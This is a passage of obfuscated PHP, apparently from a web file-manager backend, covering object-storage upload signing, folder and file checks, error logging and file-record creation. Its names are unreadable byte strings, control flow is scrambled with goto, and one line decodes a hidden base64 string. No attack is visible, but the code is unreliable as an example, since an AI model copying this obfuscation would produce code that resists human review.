$c†‹Ä²ù©[193], $c†‹Ä²ù©[33]); return $F¦—Ü¥³¾ä; } public function uploadFormData($dâİë¡Ü¼, $DØò…Ì–Öä = 3600) { $Eâá×ö®Ô„ =& $_SERVER[Ö]; $fëµÔ®ºÜÅ = $this->pathFather($dâİë¡Ü¼); $D…Ò¤Õãñ = $this->client->getHttpUploadPostParams($this->bucket, $fëµÔ®ºÜÅ, $Eâá×ö®Ô„[181], $DØò…Ì–Öä); return array_merge((array) $D…Ò¤Õãñ, array($Eâá×ö®Ô„[165] => $this->getHost())); } public function multiUploadFormData($eÓÙå´‹Š‰, $E¸Ğî×”òÁ = 3600) { $bºáïÃ¸âŒ =& $_SERVER[Ö]; $Fá¯ª¹½ä = gmdate($bºáïÃ¸âŒ[204]); $cøÓ‘â„‰î = array(); $b”‘ÑÈŸ‹ = $this->client->getUploadId($this->bucket, $eÓÙå´‹Š‰, $cøÓ‘â„‰î); if (!$b”‘ÑÈŸ‹) { return !1; } return array($bºáïÃ¸âŒ[205] => $b”‘ÑÈŸ‹, $bºáïÃ¸âŒ[165] => $this->getHost() . $bºáïÃ¸âŒ[8] . $this->pathEncode($eÓÙå´‹Š‰), $bºáïÃ¸âŒ[206] => $Fá¯ª¹½ä, $bºáïÃ¸âŒ[89] => $eÓÙå´‹Š‰); } public function multiUploadAuthData($b’ƒù™œ¤î, $CÇ¼º½Öß• = array()) { goto C‘öˆËØÒ; D…„§Ö˜é: if (strpos($CïÖ‚ëè‰, $f£ŸÙƒ‘ŠÜ[209]) === 0) { return array($f£ŸÙƒ‘ŠÜ[216] => $d÷®›–ğ£, $f£ŸÙƒ‘ŠÜ[206] => $Bø¨Ğ“Á¼¶); } return $d÷®›–ğ£; goto eîÃ«­ò›‹; Cä‘Õ†ëîĞ: $Aˆ—ÖçôØÒ = $CÇ¼º½Öß•[$f£ŸÙƒ‘ŠÜ[89]]; unset($CÇ¼º½Öß•[$f£ŸÙƒ‘ŠÜ[89]]); if (isset($CÇ¼º½Öß•[$f£ŸÙƒ‘ŠÜ[207]])) { $CÇ¼º½Öß•[$f£ŸÙƒ‘ŠÜ[206]] = $Bø¨Ğ“Á¼¶; return $this->listUploadParts($Aˆ—ÖçôØÒ, $CÇ¼º½Öß•); } goto cå‰ïÎØ—›; cå‰ïÎØ—›: $B¹øà´àô… = array($f£ŸÙƒ‘ŠÜ[208], $f£ŸÙƒ‘ŠÜ[33], $f£ŸÙƒ‘ŠÜ[115], $f£ŸÙƒ‘ŠÜ[33], "\170\55\x61\x6d\x7a\55\144\141\x74\x65\x3a{$Bø¨Ğ“Á¼¶}", $f£ŸÙƒ‘ŠÜ[8] . $this->bucket . $f£ŸÙƒ‘ŠÜ[8] . $this->pathEncode($Aˆ—ÖçôØÒ) . $CïÖ‚ëè‰); if (strpos($CïÖ‚ëè‰, $f£ŸÙƒ‘ŠÜ[209]) === 0) { $B¹øà´àô…[0] = $f£ŸÙƒ‘ŠÜ[210]; } if (isset($CÇ¼º½Öß•[$f£ŸÙƒ‘ŠÜ[211]]) && $CÇ¼º½Öß•[$f£ŸÙƒ‘ŠÜ[211]] == $f£ŸÙƒ‘ŠÜ[212]) { $B¹øà´àô…[0] = $f£ŸÙƒ‘ŠÜ[212]; } goto eÊ¢±…Ë; C‘öˆËØÒ: $f£ŸÙƒ‘ŠÜ =& $_SERVER[Ö]; $Bø¨Ğ“Á¼¶ = isset($CÇ¼º½Öß•[$f£ŸÙƒ‘ŠÜ[206]]) ? $CÇ¼º½Öß•[$f£ŸÙƒ‘ŠÜ[206]] : gmdate($f£ŸÙƒ‘ŠÜ[204]); $CïÖ‚ëè‰ = isset($CÇ¼º½Öß•[$f£ŸÙƒ‘ŠÜ[156]]) ? $CÇ¼º½Öß•[$f£ŸÙƒ‘ŠÜ[156]] : $f£ŸÙƒ‘ŠÜ[33]; goto Cä‘Õ†ëîĞ; eÊ¢±…Ë: $b¼Ù»¹…Æ‰ = implode($f£ŸÙƒ‘ŠÜ[213], $B¹øà´àô…); $Dğ°ì­ã„ = base64_encode(hash_hmac($f£ŸÙƒ‘ŠÜ[214], $b¼Ù»¹…Æ‰, $this->secret, !0)); $d÷®›–ğ£ = $f£ŸÙƒ‘ŠÜ[215] . $this->accessKey . $f£ŸÙƒ‘ŠÜ[4] . $Dğ°ì­ã„; goto D…„§Ö˜é; eîÃ«­ò›‹: } public function listUploadParts($Aà©º…œ¹–, $b«ë¦‘´ÍÚ = array()) { goto d±ÇóÌÑÈ; C„Î»é®†: $fä¨à‚‡…Õ = $this->multiUploadAuthData($Aà©º…œ¹–, $b«ë¦‘´ÍÚ); if (empty($fä¨à‚‡…Õ)) { return !1; } return array($bÒ±Õ«É[216] => $fä¨à‚‡…Õ, $bÒ±Õ«É[206] => $b«ë¦‘´ÍÚ[$bÒ±Õ«É[206]], $bÒ±Õ«É[218] => $e‚¡ô…Œ¤); goto cçÏ´à´Ş; d±ÇóÌÑÈ: $bÒ±Õ«É =& $_SERVER[Ö]; $DÜ¼®š°‡ê = str_replace($bÒ±Õ«É[217], $bÒ±Õ«É[33], $b«ë¦‘´ÍÚ[$bÒ±Õ«É[156]]); $e‚¡ô…Œ¤ = $this->client->listParts($this->bucket, $Aà©º…œ¹–, $DÜ¼®š°‡ê); goto bµ£ùÀ¢ãª; bµ£ùÀ¢ãª: if (!$e‚¡ô…Œ¤) { return !1; } unset($b«ë¦‘´ÍÚ[$bÒ±Õ«É[207]], $b«ë¦‘´ÍÚ[$bÒ±Õ«É[211]]); $b«ë¦‘´ÍÚ[$bÒ±Õ«É[89]] = $Aà©º…œ¹–; goto C„Î»é®†; cçÏ´à´Ş: } public function getHost() { return parent::getHost() . $_SERVER[Ö][8] . $this->bucket; } public function size($E¢¯ˆñ§¢‚) { $aİ¶Ğ°õŸ™ = $this->objectMeta($E¢¯ˆñ§¢‚); return $aİ¶Ğ°õŸ™ ? $aİ¶Ğ°õŸ™[$_SERVER[Ö][77]] : 0; } public function info($E¦éµöØƒ) { if ($this->isFolder($E¦éµöØƒ)) { return $this->folderInfo($E¦éµöØƒ); } else { if ($this->isFile($E¦éµöØƒ)) { return $this->fileInfo($E¦éµöØƒ); } } return !1; } public function exist($Eä·»·ƒöù) { return $this->isFile($Eä·»·ƒöù) || $this->isFolder($Eä·»·ƒöù); } public function isFile($b¹³¤Î¾µ) { return !$this->isFolder($b¹³¤Î¾µ) && $this->objectMeta($b¹³¤Î¾µ); } public function isFolder($f’ÕÄ—Â·Ø) { return $this->cacheMethod($_SERVER[Ö][219], $f’ÕÄ—Â·Ø); } protected function objectMeta($a ¢´à¯í¨) { return $this->cacheMethod($_SERVER[Ö][220], $a ¢´à¯í¨); } protected function _objectMeta($FÁÚõÑ²‡) { $E¡ë‹½ßØ… =& $_SERVER[Ö]; $FÁÚõÑ²‡ = rtrim($FÁÚõÑ²‡, $E¡ë‹½ßØ…[8]); try { $E´°» Ğ‡ª = $this->client->getObjectInfo($this->bucket, $FÁÚõÑ²‡); if (!isset($E´°» Ğ‡ª[$E¡ë‹½ßØ…[203]]) && isset($E´°» Ğ‡ª[$E¡ë‹½ßØ…[221]])) { $E´°» Ğ‡ª[$E¡ë‹½ßØ…[203]] = $E´°» Ğ‡ª[$E¡ë‹½ßØ…[221]]; } } catch (OSS\Core\OssException $aå›êÂ¶ô) { $E´°» Ğ‡ª = !1; } if (!$E´°» Ğ‡ª) { } return $E´°» Ğ‡ª; } protected function _isFolder($A“Ğñ’ïÉŒ) { goto eÍåñ¸œÉ»; Cø“ÕÊêî×: $Fòôªñß–Æ = $this->client->getBucket($this->bucket, $A“Ğñ’ïÉŒ, null, 1); if (empty($Fòôªñß–Æ)) { return !1; } $Fòôªñß–Æ = array_values($Fòôªñß–Æ); goto E­ÂŞÏÃĞ; E­ÂŞÏÃĞ: if (substr($Fòôªñß–Æ[0][$Bëø¸„Šß[28]], -1) == $Bëø¸„Šß[8]) { return !0; } if (get_path_this($Fòôªñß–Æ[0][$Bëø¸„Šß[28]]) == get_path_this($A“Ğñ’ïÉŒ)) { return !1; } return !0; goto cÒÜ½šË¤„; eÍåñ¸œÉ»: $Bëø¸„Šß =& $_SERVER[Ö]; $A“Ğñ’ïÉŒ = rtrim($A“Ğñ’ïÉŒ, $Bëø¸„Šß[8]); if ($A“Ğñ’ïÉŒ == $Bëø¸„Šß[33] || $A“Ğñ’ïÉŒ == $Bëø¸„Šß[8]) { return !0; } goto Cø“ÕÊêî×; cÒÜ½šË¤„: } } define($_SERVER[Ö][222], 1); goto c—ôßÄğÚ›; BÆ´øá¯ºŠ: function beforeShutdownError($d–²œŠÑÄ = false, $dÓ˜’“÷À = '', $F„†œÇ¾µ = '', $E¥İ­¿ğ› = 0) { $cäì÷ĞÏ¡° =& $_SERVER[Ç·ÕÂû¼„]; switch ($d–²œŠÑÄ) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $D×…ˆ±øÁ = $cäì÷ĞÏ¡°[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $D×…ˆ±øÁ = $cäì÷ĞÏ¡°[40]; break; case E_STRICT: $D×…ˆ±øÁ = $cäì÷ĞÏ¡°[41]; break; case E_NOTICE: case E_USER_NOTICE: $D×…ˆ±øÁ = $cäì÷ĞÏ¡°[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $D×…ˆ±øÁ = $cäì÷ĞÏ¡°[43]; break; default: break; } if (!$D×…ˆ±øÁ || $D×…ˆ±øÁ == $cäì÷ĞÏ¡°[42] || $D×…ˆ±øÁ == $cäì÷ĞÏ¡°[43]) { return; } $F„†œÇ¾µ = $cäì÷ĞÏ¡°[4] . str_replace($_SERVER[$cäì÷ĞÏ¡°[37]], $cäì÷ĞÏ¡°[20], $F„†œÇ¾µ); $DëÀôƒõàä = $D×…ˆ±øÁ . $cäì÷ĞÏ¡°[44] . $dÓ˜’“÷À . $cäì÷ĞÏ¡°[44] . $F„†œÇ¾µ . $cäì÷ĞÏ¡°[44] . $E¥İ­¿ğ›; write_log($DëÀôƒõàä . $cäì÷ĞÏ¡°[18] . get_caller_msg(1), $cäì÷ĞÏ¡°[19]); } $_SERVER[$_SERVER[Ç·ÕÂû¼„][45]] = $_SERVER[$_SERVER[Ç·ÕÂû¼„][37]] . $_SERVER[Ç·ÕÂû¼„][46]; $FñùŞ¶³ÏĞ = strrev(base64_decode($_SERVER[Ç·ÕÂû¼„][47])); goto cÓ‹ÆËöÉ; bŠµ†‘Ş¾ñ: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($EôÃÙ®Êğ) { $F÷…×‚­ğ£ =& $_SERVER[Ö]; $E¨Ä²©ÌÃ = Model($F÷…×‚­ğ£[470])->where(array($F÷…×‚­ğ£[1405] => $EôÃÙ®Êğ))->find(); $f¿¨Ê†ïİ’ = $this->_mkdirRoot(SourceModel::TYPE_USER, $EôÃÙ®Êğ, $E¨Ä²©ÌÃ[$F÷…×‚­ğ£[28]]); $this->userDesktopAdd($f¿¨Ê†ïİ’); return $f¿¨Ê†ïİ’; } public function userDesktopAdd($E •‰†‡Å) { $a˜ÂÚãÍŞ¢ =& $_SERVER[Ö]; $EÔ¶ğÜŒÜ¼ = LNG($a˜ÂÚãÍŞ¢[2299]); $c©Á×ç·é = $this->mkdir($E •‰†‡Å, $EÔ¶ğÜŒÜ¼); $this->metaSet($c©Á×ç·é, $a˜ÂÚãÍŞ¢[2300], $a˜ÂÚãÍŞ¢[83]); $this->metaSet($E •‰†‡Å, $a˜ÂÚãÍŞ¢[2301], $c©Á×ç·é); } public function groupRootAdd($aŒì¼†ÍÀ) { $a¡‡ÓÈ«‡‚ =& $_SERVER[Ö]; $C¤•õ©Äî = Model($a¡‡ÓÈ«‡‚[454])->where(array($a¡‡ÓÈ«‡‚[2149] => $aŒì¼†ÍÀ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $aŒì¼†ÍÀ, $C¤•õ©Äî[$a¡‡ÓÈ«‡‚[28]]); } public function systemRootPathAdd($DØÆ ‚§µ–) { if ($DØÆ ‚§µ– != $_SERVER[Ö][1082]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $DØÆ ‚§µ–); } public function userRootRemove($AØÁÉ…”ğÂ) { $aæÓÓÎ»Ü† = $this->sourceRoot(SourceModel::TYPE_USER, $AØÁÉ…”ğÂ); if (!$aæÓÓÎ»Ü†) { return; } $this->remove($aæÓÓÎ»Ü†, !1); } public function groupRootRemove($fìĞ¹ËÃ‰) { $AªîäÛ…šï = $this->sourceRoot(SourceModel::TYPE_GROUP, $fìĞ¹ËÃ‰); if (!$AªîäÛ…šï) { return; } $this->remove($AªîäÛ…šï, !1); } private function _mkdirRoot($F¡¤¢¸¾·Ñ, $cšç‚Ó¼É, $dèŒ‹”³ÜÁ) { goto eæ×Ô¥ğ»; A¤©–êÓ¬¬: $c„å”Êù = "\115\157\x64\x65\154\x53\157\x75\x72\x63\145\56\155\153\x64\x69\x72\x52\157\x6f\x74\56{$F¡¤¢¸¾·Ñ}\x2e{$cšç‚Ó¼É}\56" . $dèŒ‹”³ÜÁ; CacheLock::lock($c„å”Êù); $C´Ù„‚ˆ‚«[$e”„ÊÚéé·[28]] = $dèŒ‹”³ÜÁ; goto D´´ÍõÖ×®; EÜ’É‹¸‰°: CacheLock::unlock($c„å”Êù); return $d”ÛàÃ…½í; goto E‹Œ²®âƒ¬; eæ×Ô¥ğ»: $e”„ÊÚéé· =& $_SERVER[Ö]; $C´Ù„‚ˆ‚« = array($e”„ÊÚéé·[364] => 0, $e”„ÊÚéé·[517] => $F¡¤¢¸¾·Ñ, $e”„ÊÚéé·[518] => $cšç‚Ó¼É, $e”„ÊÚéé·[514] => 1, $e”„ÊÚéé·[519] => USER_ID, $e”„ÊÚéé·[520] => USER_ID, $e”„ÊÚéé·[515] => $e”„ÊÚéé·[33], $e”„ÊÚéé·[521] => $e”„ÊÚéé·[466], $e”„ÊÚéé·[392] => 0, $e”„ÊÚéé·[516] => 0, $e”„ÊÚéé·[416] => 0, $e”„ÊÚéé·[522] => $e”„ÊÚéé·[33]); if ($F¸…ƒ˜´¹š = $this->where($C´Ù„‚ˆ‚«)->find()) { return $F¸…ƒ˜´¹š[$e”„ÊÚéé·[365]]; } goto A¤©–êÓ¬¬; D´´ÍõÖ×®: $d”ÛàÃ…½í = $this->add($C´Ù„‚ˆ‚«); $FˆŒ¡¶ë‘ = array($e”„ÊÚéé·[523] => short_id($d”ÛàÃ…½í)); $this->where(array($e”„ÊÚéé·[379] => $d”ÛàÃ…½í))->save($FˆŒ¡¶ë‘); goto EÜ’É‹¸‰°; E‹Œ²®âƒ¬: } private function sourceRoot($E‡½†ğÙˆƒ, $eİ¦øµŒõ, $a¼éæî±ª = false) { $f¨„ß¨‹ÕØ =& $_SERVER[Ö]; $e‘¬æŞôŠ˜ = array($f¨„ß¨‹ÕØ[364] => 0, $f¨„ß¨‹ÕØ[517] => $E‡½†ğÙˆƒ, $f¨„ß¨‹ÕØ[518] => $eİ¦øµŒõ); if ($Cæª¾‡£¨· = $this->where($e‘¬æŞôŠ˜)->find()) { return $a¼éæî±ª ? $Cæª¾‡£¨· : $Cæª¾‡£¨·[$f¨„ß¨‹ÕØ[365]]; } return !1; } public function sourceRootGroup($F¿¬ä¦™Œ) { $a¼–¿†’ =& $_SERVER[Ö]; if (is_string($F¿¬ä¦™Œ)) { $F¿¬ä¦™Œ = array($F¿¬ä¦™Œ); } $EµÛÚÅÕ¹² = array($a¼–¿†’[364] => 0, $a¼–¿†’[517] => SourceModel::TYPE_GROUP, $a¼–¿†’[518] => array($a¼–¿†’[7], $F¿¬ä¦™Œ)); $Bö‘åŞµ™ = $this->listSource($EµÛÚÅÕ¹², 1000); return array_to_keyvalue($Bö‘åŞµ™[$a¼–¿†’[74]], $a¼–¿†’[452]); } public function mkfile($dŞ¼Ó˜“, $Cç³¾À²ÔÁ, $cĞ‘‚¢Ø›Ç = '', $fğÁË¤ÄÀˆ = REPEAT_RENAME) { $b¡¨ ·“Ôä =& $_SERVER[Ö]; $A£àŠËœ™Ë = Model($b¡¨ ·“Ôä[540])->addFileByContent($cĞ‘‚¢Ø›Ç, $Cç³¾À²ÔÁ); return $this->_createFileCall($dŞ¼Ó˜“, $Cç³¾À²ÔÁ, $A£àŠËœ™Ë, $fğÁË¤ÄÀˆ, $b¡¨ ·“Ôä[1111]); } public function addFile($DîÓÅÙ¯ë“, $BÉ¬µÜˆÂ×, $bâ†ßã…Ïâ, $eäŠ°èóŠ˜ = false, $a·¨ì¡¬•ã = REPEAT_RENAME) { $Fàâ ÷Æ‚§ = Model($_SERVER[Ö][540])->addFile($BÉ¬µÜˆÂ×, $bâ†ßã…Ïâ, $eäŠ°èóŠ˜); return $this->_createFileCall($DîÓÅÙ¯ë“, $bâ†ßã…Ïâ, $Fàâ ÷Æ‚§, $a·¨ì¡¬•ã); } public function addFileByFileID($CØœÙçŞ„†, $A›­”Ä’¤, $eÚ‘ƒ‡Œ”, $c›Õ¿Û³Î§ = REPEAT_RENAME) { $b¨‚öË« =& $_SERVER[Ö]; $BÚâ‘µÒÏ˜ = Model($b¨‚öË«[540])->find($A›­”Ä’¤); Model($b¨‚öË«[540])->linkAdd($A›­”Ä’¤); return $this->_createFileCall($CØœÙçŞ„†, $eÚ‘ƒ‡Œ”, $BÚâ‘µÒÏ˜, $c›Õ¿Û³Î§); } public function addFileByRemote($aŒ±ø´—®, $AæºøôÅ˜±, $dÙÚç³ù«—, $BÏ¯×íó±¬ = array(), $aˆæ§õÆî× = REPEAT_RENAME) { $F¼õœ…’±† = Model($_SERVER[Ö][540])->addFileByRemote($AæºøôÅ˜±, $dÙÚç³ù«—, $BÏ¯×íó±¬); return $this->_createFileCall($aŒ±ø´—®, $dÙÚç³ù«—, $F¼õœ…’±†, $aˆæ§õÆî×); } private function _createFileCall($A’ÔÊ¡ç”ğ, $D‡ÙÂ®×Ãô, $B¢ÓÍ­È—, $F­Ğ‹Ùóğ“, $fíÄ„áØšŸ = "\x75\160\154\x6f\x61\x64") { goto D„«Ú¹Ã; E„Ùòëªã¿: $D…¾£¨¦›… = $this->_createFile($A’ÔÊ¡ç”ğ, $D‡ÙÂ®×Ãô, $B¢ÓÍ­È—, $F­Ğ‹Ùóğ“, $cˆÎ°Š›—¨); if (!$cˆÎ°Š›—¨) { Model($cÙ§ÜÛòã¿[418])->remove($B¢ÓÍ­È—[$cÙ§ÜÛòã¿[415]]); } else { if ($D…¾£¨¦›…) { Model($cÙ§ÜÛòã¿[2272])->eventCreate($D…¾£¨¦›…, $fíÄ„áØšŸ); } } $this->lockWriteEnd($A’ÔÊ¡ç”ğ, $D‡ÙÂ®×Ãô); goto F¤î©ÅÔà‹; D„«Ú¹Ã: $cÙ§ÜÛòã¿ =& $_SERVER[Ö]; $cˆÎ°Š›—¨ = !1; $this->lockWriteStart($A’ÔÊ¡ç”ğ, $D‡ÙÂ®×Ãô); goto E„Ùòëªã¿; F¤î©ÅÔà‹: return $D…¾£¨¦›…; goto D°¿§Æ—¹â; D°¿§Æ—¹â: } public function mkdir($cÒ×çî¢‚¼, $CÀê²ØËá, $bî‚ˆÓ™ƒ’ = REPEAT_SKIP) { goto Aš±ŞÆ§æ; BÈ±‚Ëœ‚Î: $aùò÷ø½Ÿ = $this->_addSoure($CÃÂ¸¬ª£Ÿ, $BØªÎÄÏ“); Model($fĞ‚ìÌè‡[2272])->eventCreate($aùò÷ø½Ÿ, $fĞ‚ìÌè‡[1112]); $this->lockWriteEnd($cÒ×çî¢‚¼, $CÀê²ØËá); goto FÁ‚ëÎ•øº; FÁ‚ëÎ•øº: return $aùò÷ø½Ÿ; goto b´³Ã”±¬; Aš±ŞÆ§æ: $fĞ‚ìÌè‡ =& $_SERVER[Ö]; $BØªÎÄÏ“ = $this->sourceInfo($cÒ×çî¢‚¼); if (!$BØªÎÄÏ“) { return !1; } goto cæ‹ĞÃ¤î; cæ‹ĞÃ¤î: $this->lockWriteStart($cÒ×çî¢‚¼, $CÀê²ØËá); if ($bî‚ˆÓ™ƒ’ !== !1) { $cäÙÂÀ¢ = $this->fileNameExist($cÒ×çî¢‚¼, $CÀê²ØËá); if ($cäÙÂÀ¢ && $bî‚ˆÓ™ƒ’ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($cÒ×çî¢‚¼, $CÀê²ØËá); return $cäÙÂÀ¢; } $CÀê²ØËá = $this->fileNameAuto($cÒ×çî¢‚¼, $CÀê²ØËá, $bî‚ˆÓ™ƒ’); } $CÃÂ¸¬ª£Ÿ = array($fĞ‚ìÌè‡[514] => 1, $fĞ‚ìÌè‡[382] => $CÀê²ØËá, $fĞ‚ìÌè‡[515] => $fĞ‚ìÌè‡[33], $fĞ‚ìÌè‡[416] => 0, $fĞ‚ìÌè‡[516] => 0); goto BÈ±‚Ëœ‚Î; b´³Ã”±¬: } private function _createFile($AÈÕæØ´ºˆ, $FŒ±óÌ¾õ, $cíâå®Èä¥, $E‰•º´Ñ, &$Fù°®„×à¡) { goto FœŸ„ªºä; FõÆ‰‘é: $B‚À—õ‰î = array($E‚Ë÷Ş™„‹[514] => 0, $E‚Ë÷Ş™„‹[382] => $FŒ±óÌ¾õ, $E‚Ë÷Ş™„‹[515] => get_path_ext($FŒ±óÌ¾õ), $E‚Ë÷Ş™„‹[416] => $cíâå®Èä¥[$E‚Ë÷Ş™„‹[415]], $E‚Ë÷Ş™„‹[516] => $cíâå®Èä¥[$E‚Ë÷Ş™„‹[77]]); $E÷À©Ú¡½ = $this->_addSoure($B‚À—õ‰î, $f±Ë·ùÖ¦Ÿ); $this->folderSizeReset($AÈÕæØ´ºˆ); goto bì»™¦í³ç; C«Ñšï×É«: if ($E‰•º´Ñ !== !1) { $A£Â»åÕô‡ = $this->fileNameExist($AÈÕæØ´ºˆ, $FŒ±óÌ¾õ); } $Fù°®„×à¡ = !0; if ($E‰•º´Ñ && $A£Â»åÕô‡) { if ($E‰•º´Ñ == REPEAT_SKIP) { $Fù°®„×à¡ = !1; return $A£Â»åÕô‡; } else { if ($E‰•º´Ñ == REPEAT_REPLACE) { $cÈô¥’öœà = $this->sourceInfo($A£Â»åÕô‡); $eœ„ëäï  = $this->fileHistory($cÈô¥’öœà, $cíâå®Èä¥[$E‚Ë÷Ş™„‹[415]], $cíâå®Èä¥[$E‚Ë÷Ş™„‹[77]]); if (!$eœ„ëäï ) { $Fù°®„×à¡ = !1; } else { $this->folderSizeReset($AÈÕæØ´ºˆ); } return $A£Â»åÕô‡; } else { $FŒ±óÌ¾õ = $this->fileNameAuto($AÈÕæØ´ºˆ, $FŒ±óÌ¾õ, $E‰•º´Ñ, !1); } } } goto FõÆ‰‘é; FœŸ„ªºä: $E‚Ë÷Ş™„‹ =& $_SERVER[Ö]; $f±Ë·ùÖ¦Ÿ = $this->sourceInfo($AÈÕæØ´ºˆ); if (!$cíâå®Èä¥ || !$f±Ë·ùÖ¦Ÿ) { return !1; } goto C«Ñšï×É«; bì»™¦í³ç: return $E÷À©Ú¡½; goto EÈÇõí›ñ; EÈÇõí›ñ: } protected function fileHistory($CèòÒ”¿, $BÖ‰‹ÉáËä, $d«ˆÖÒáÆˆ) { goto BÉÈåƒ®›; CÖ±é¹ÔÊò: return !0; goto dëïí„Ö; F†Š·ËÛµ»: Model($c¥±ˆÓÏ¸„[2302])->addHistory($CèòÒ”¿); $CİÕèÇÌˆÔ = array($c¥±ˆÓÏ¸„[520] => USER_ID, $c¥±ˆÓÏ¸„[386] => time(), $c¥±ˆÓÏ¸„[415] => $BÖ‰‹ÉáËä, $c¥±ˆÓÏ¸„[77] => $d«ˆÖÒáÆˆ); $this->where(array($c¥±ˆÓÏ¸„[379] => $CèòÒ”¿[$c¥±ˆÓÏ¸„[365]]))->save($CİÕèÇÌˆÔ); goto CÖ±é¹ÔÊò; BÉÈåƒ®›: $c¥±ˆÓÏ¸„ =& $_SERVER[Ö]; if ($CèòÒ”¿[$c¥±ˆÓÏ¸„[415]] == $BÖ‰‹ÉáËä) { return !1; } $this->checkLock($CèòÒ”¿[$c¥±ˆÓÏ¸„[365]], $BÖ‰‹ÉáËä); goto F†Š·ËÛµ»; dëïí„Ö: } public function checkLock($E¨è‘§ ¼, $fÈÒÈò²ò¢) { goto eÑ§ŒÉªÕ; CÆ¾ÀÙÀ‡: $CÅäÃÙã™¦ = Session::get($dÛ©¾ñÚ»[2303]); $B­—¸¼¤ß = substr($fÍ¥Ó‹×ÄÁ[$dÛ©¾ñÚ»[28]], 0, -1 - strlen($fÍ¥Ó‹×ÄÁ[$dÛ©¾ñÚ»[156]])) . $dÛ©¾ñÚ»[1367] . $CÅäÃÙã™¦ . $dÛ©¾ñÚ»[91] . $fÍ¥Ó‹×ÄÁ[$dÛ©¾ñÚ»[156]]; $DÛÚ‡²¨±ò = Model($dÛ©¾ñÚ»[540])->find($fÈÒÈò²ò¢); goto DôˆÁ°·³; eÑ§ŒÉªÕ: $dÛ©¾ñÚ» =& $_SERVER[Ö]; $fÍ¥Ó‹×ÄÁ = $this->pathInfo($E¨è‘§ ¼); if (!$this->fileIsLock($fÍ¥Ó‹×ÄÁ, !0)) { return; } goto CÆ¾ÀÙÀ‡; eƒï „„ª°: show_json(LNG($dÛ©¾ñÚ»[2305]) . $dÛ©¾ñÚ»[2306] . LNG($dÛ©¾ñÚ»[2307]) . $dÛ©¾ñÚ»[2308] . $d·‚ Š—àê . $dÛ©¾ñÚ»[2309], !1); goto bİˆÕÏÎéè; DôˆÁ°·³: $this->_createFileCall($fÍ¥Ó‹×ÄÁ[$dÛ©¾ñÚ»[457]], $B­—¸¼¤ß, $DÛÚ‡²¨±ò, REPEAT_REPLACE, $dÛ©¾ñÚ»[1111]); $E¯¦‹†¡¾ = $fÍ¥Ó‹×ÄÁ[$dÛ©¾ñÚ»[413]][$dÛ©¾ñÚ»[477]]; $d·‚ Š—àê = $E¯¦‹†¡¾[$dÛ©¾ñÚ»[2304]] ? $E¯¦‹†¡¾[$dÛ©¾ñÚ»[2304]] : $E¯¦‹†¡¾[$dÛ©¾ñÚ»[28]]; goto eƒï „„ª°; bİˆÕÏÎéè: } public function fileIsLock($Føõ‘ŠÖ¤³, $A‰±ä—’ÉÙ = false) { goto fÖˆ˜™ôä; aïß¨Ö­…: $bˆŸÛëá¦ = $GLOBALS[$aÄ¬çÊê×´[6]][$aÄ¬çÊê×´[84]][$aÄ¬çÊê×´[475]]; if ($Føõ‘ŠÖ¤³[$aÄ¬çÊê×´[413]][$aÄ¬çÊê×´[476]] <= time() - $bˆŸÛëá¦) { $this->metaSet($Føõ‘ŠÖ¤³[$aÄ¬çÊê×´[365]], $aÄ¬çÊê×´[474], null); $this->metaSet($Føõ‘ŠÖ¤³[$aÄ¬çÊê×´[365]], $aÄ¬çÊê×´[476], null); } if ($A‰±ä—’ÉÙ) { $this->metaSet($Føõ‘ŠÖ¤³[$aÄ¬çÊê×´[365]], $aÄ¬çÊê×´[476], time()); } goto a¤ãæƒç™Í; a¤ãæƒç™Í: return !1; goto d¾‰˜“±ñ“; fÖˆ˜™ôä: $aÄ¬çÊê×´ =& $_SERVER[Ö]; if (!isset($Føõ‘ŠÖ¤³[$aÄ¬çÊê×´[413]]) || !$Føõ‘ŠÖ¤³[$aÄ¬çÊê×´[413]][$aÄ¬çÊê×´[474]]) { return !1; } if ($Føõ‘ŠÖ¤³[$aÄ¬çÊê×´[413]][$aÄ¬çÊê×´[474]] != USER_ID) { return !0; } goto aïß¨Ö­…; d¾‰˜“±ñ“: } private function _addSoure($bµÖŒË¬öê, $fÑ Ÿ¡à¾±) { goto A¨†‚˜ÄÅÈ; b´ÀæïáÖô: $Dææ†’¿†Ô = array($BÂÉ¿ğÚÉ™[523] => short_id($Aœ­ª°Ï½)); $this->where(array($BÂÉ¿ğÚÉ™[379] => $Aœ­ª°Ï½))->save($Dææ†’¿†Ô); $this->setNamePinyin($Aœ­ª°Ï½, $bµÖŒË¬öê[$BÂÉ¿ğÚÉ™[28]]); goto A¢ùˆ•·§; A¨†‚˜ÄÅÈ: $BÂÉ¿ğÚÉ™ =& $_SERVER[Ö]; $B¥Üç›šÑ = array($BÂÉ¿ğÚÉ™[517] => $fÑ Ÿ¡à¾±[$BÂÉ¿ğÚÉ™[367]], $BÂÉ¿ğÚÉ™[518] => $fÑ Ÿ¡à¾±[$BÂÉ¿ğÚÉ™[452]], $BÂÉ¿ğÚÉ™[519] => USER_ID, $BÂÉ¿ğÚÉ™[520] => USER_ID, $BÂÉ¿ğÚÉ™[364] => $fÑ Ÿ¡à¾±[$BÂÉ¿ğÚÉ™[365]], $BÂÉ¿ğÚÉ™[521] => $fÑ Ÿ¡à¾±[$BÂÉ¿ğÚÉ™[455]] . $fÑ Ÿ¡à¾±[$BÂÉ¿ğÚÉ™[365]] . $BÂÉ¿ğÚÉ™[47], $BÂÉ¿ğÚÉ™[392] => 0, $BÂÉ¿ğÚÉ™[522] => $BÂÉ¿ğÚÉ™[33]); $bµÖŒË¬öê = array_merge($B¥Üç›šÑ, $bµÖŒË¬öê); goto aÃÎ­–İ; F¢Õä“¥ªŒ: static $CÌÆŞô‚„¬ = false; if (!$CÌÆŞô‚„¬) { Hook::trigger($BÂÉ¿ğÚÉ™[504], $bµÖŒË¬öê); $CÌÆŞô‚„¬ = !0; } $Aœ­ª°Ï½ = $this->add($bµÖŒË¬öê); goto b´ÀæïáÖô; A¢ùˆ•·§: return $Aœ­ª°Ï½; goto B®œóÍñ˜È; aÃÎ­–İ: 